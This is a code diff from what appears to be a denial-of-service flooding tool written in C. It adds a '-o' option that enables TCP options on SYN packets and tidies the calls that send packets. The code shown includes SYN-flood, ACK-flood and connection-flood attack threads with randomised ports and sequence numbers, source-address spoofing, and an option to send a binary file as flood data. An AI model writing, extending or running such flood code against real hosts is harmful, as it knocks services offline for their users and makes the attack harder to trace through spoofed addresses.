@@ -38,6 +38,7 @@ uint32_t spoof_addresses_size = 0;
 uint8_t *send_data = NULL;
 int send_data_size = 0;
 int quiet = 0;
+int use_tcp_options = 0;
 
 
 /* handle term signals */
@@ -75,7 +76,11 @@ void *conn_flood_attack_thread(void *param)
             src_port = 1025;
         id = leef_random_byte() << 8 | leef_random_byte();
         seq = action_uuid << 16 | id;
-        leef_send_tcp_syn(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq);
+        leef_send_tcp_syn(&leef,
+                          interface_addr, dest_addr,
+                          src_port, dest_port,
+                          id, seq,
+                          use_tcp_options);
         if(sleep_interval)
             usleep(sleep_interval);
     }
@@ -170,29 +175,19 @@ void conn_flood_sniff_thread()
                     ack_seq = packet.in_ip.tcp->seq + 1;
 
                     if(send_data_size) {
-                        leef_send_raw_tcp(&leef,
-                                          interface_addr,
-                                          dest_addr,
-                                          src_port,
-                                          dest_port,
-                                          id,
-                                          seq,
-                                          ack_seq,
-                                          TCP_ACK | TCP_PUSH,
-                                          5840,
-                                          leef_random_range(56,70),
-                                          send_data_size,
-                                          send_data);
+                        leef_send_raw_tcp2(&leef,
+                                           interface_addr, dest_addr,
+                                           src_port, dest_port,
+                                           id, seq, ack_seq,
+                                           TCP_ACK | TCP_PUSH,
+                                           send_data_size,
+                                           send_data);
                         tx_bytes += 54 + send_data_size;
                     } else {
                         leef_send_tcp_ack(&leef,
-                                          interface_addr,
-                                          dest_addr,
-                                          src_port,
-                                          dest_port,
-                                          id,
-                                          seq,
-                                          ack_seq);
+                                          interface_addr, dest_addr,
+                                          src_port, dest_port,
+                                          id, seq, ack_seq);
                         tx_bytes += 54;
                     }
 
@@ -314,12 +309,10 @@ void *syn_flood_attack_thread(void *param)
 
     while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
         leef_send_tcp_syn(&leef,
-                          get_src_ip(),
-                          dest_addr,
-                          leef_random_range(1025,65535),
-                          dest_port == 0 ? leef_random_u16() : dest_port,
-                          leef_random_u16(),
-                          action_uuid << 16 | leef_random_u16());
+                          get_src_ip(), dest_addr,
+                          leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                          leef_random_u16(), action_uuid << 16 | leef_random_u16(),
+                          use_tcp_options);
         if(sleep_interval)
             usleep(sleep_interval);
     }
@@ -338,13 +331,9 @@ void *ack_flood_attack_thread(void *param)
 
     while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
         leef_send_tcp_ack(&leef,
-                          get_src_ip(),
-                          dest_addr,
-                          leef_random_range(1025,65535),
-                          dest_port == 0 ? leef_random_u16() : dest_port,
-                          leef_random_u16(),
-                          action_uuid << 16 | leef_random_u16(),
-                          leef_random_u32());
+                          get_src_ip(), dest_addr,
+                          leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                          leef_random_u16(), action_uuid << 16 | leef_random_u16(), leef_random_u32());
         if(sleep_interval)
             usleep(sleep_interval);
     }
@@ -394,12 +383,10 @@ void tcp_ping_thread()
                 src_port = 1025;
 
             leef_send_tcp_syn(&leef,
-                              interface_addr,
-                              dest_addr,
-                              src_port,
-                              dest_port,
-                              leef_random_u16(),
-                              action_uuid << 16 | leef_random_u16());
+                              interface_addr, dest_addr,
+                              src_port, dest_port,
+                              leef_random_u16(), action_uuid << 16 | leef_random_u16(),
+                              use_tcp_options);
             sent++;
             ping_ports[src_port] = ticksNow;
         /* wait 1 sec before stopping */
@@ -461,6 +448,7 @@ void print_help(char **argv)
     printf("  -u [interval]     - Sleep interval in microseconds (default: 10000)\n");
     printf("  -s [ip]           - Use a custom source address\n");
     printf("  -q                - Quiet, don't print statistics output\n");
+    printf("  -o                - Enable tcp options on SYN packets\n");
     printf("  --help            - Print this help\n");
     printf("Connection flood options:\n");
     printf("  -d [binary file]  - Send binary file as data\n");
@@ -604,6 +592,9 @@ int main(int argc, char **argv)
                     }
                     break;
                 }
+                case 'o':
+                    use_tcp_options = 1;
+                    break;
                 default:
                     fprintf(stderr, "incorrect option %s, see --help\n", opt);
                     return -1;
